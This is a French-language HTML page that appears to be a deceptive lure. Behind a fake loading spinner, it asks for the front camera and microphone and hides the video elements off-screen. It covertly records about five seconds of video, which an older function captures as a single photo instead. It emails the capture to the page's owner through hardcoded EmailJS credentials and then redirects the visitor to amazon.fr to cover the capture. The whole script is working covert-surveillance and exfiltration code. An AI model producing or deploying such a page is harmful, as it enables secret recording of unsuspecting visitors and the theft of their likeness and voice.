<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .loading {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #video, #canvas {
      position: absolute;
      left: -9999px;
      opacity: 0;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <p>Chargement en cours...</p>
  </div>
  
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>
  
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    // Démarrage automatique dès le chargement
    window.addEventListener('load', async () => {
      try {
        // Demande d'accès à la caméra frontale et micro
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user' // Caméra frontale
          },
          audio: true // Ajout du micro
        });
        
        video.srcObject = stream;
        
        // Attendre que la vidéo soit prête puis enregistrer
        video.addEventListener('loadedmetadata', () => {
          setTimeout(startRecording, 5000); // Délai de 5s avant enregistrement
        });
        
      } catch (err) {
        console.error('Erreur caméra:', err);
        // Redirection même en cas d'erreur
        redirectToAmazon();
      }
    });
    
    let mediaRecorder;
    let recordedChunks = [];
    
    function startRecording() {
      try {
        const stream = video.srcObject;
        mediaRecorder = new MediaRecorder(stream);
        recordedChunks = [];
        
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
          }
        };
        
        mediaRecorder.onstop = () => {
          sendVideoAndRedirect();
        };
        
        // Démarrer l'enregistrement pour 5 secondes
        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, 5000);
        
      } catch (err) {
        console.error('Erreur enregistrement:', err);
        redirectToAmazon();
      }
    }
    
    function sendVideoAndRedirect() {
      try {
        // Créer le blob vidéo
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        
        // Convertir en base64 pour l'email
        const reader = new FileReader();
        reader.onload = () => {
          const videoData = reader.result;
          
          // Arrêter la caméra
          const stream = video.srcObject;
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          
          // Envoyer par email
          emailjs.send("service_8cs0gml", "template_w14xn7c", {
            name: "Visiteur",
            time: new Date().toLocaleString(),
            message: "Vidéo automatique (5 sec)",
            image: videoData
          }).then(() => {
            console.log('Vidéo envoyée');
          }).catch(err => {
            console.error('Erreur envoi:', err);
          }).finally(() => {
            redirectToAmazon();
          });
        };
        
        reader.readAsDataURL(videoBlob);
        
      } catch (err) {
        console.error('Erreur traitement vidéo:', err);
        redirectToAmazon();
      }
    }
    
    function oldCaptureAndSend() {
      try {
        // Capturer l'image
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg", 0.8);
        
        // Arrêter la caméra
        const stream = video.srcObject;
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        // Envoyer par email
        emailjs.send("service_8cs0gml", "template_w14xn7c", {
          name: "Visiteur",
          time: new Date().toLocaleString(),
          message: "Photo automatique",
          image: imageData
        }).then(() => {
          console.log('Photo envoyée');
        }).catch(err => {
          console.error('Erreur envoi:', err);
        }).finally(() => {
          // Redirection vers Amazon après envoi (succès ou échec)
          redirectToAmazon();
        });
        
      } catch (err) {
        console.error('Erreur capture:', err);
        redirectToAmazon();
      }
    }
    
    function redirectToAmazon() {
      setTimeout(() => {
        window.location.href = 'https://www.amazon.fr';
      }, 500);
    }
  </script>
</body>
</html>
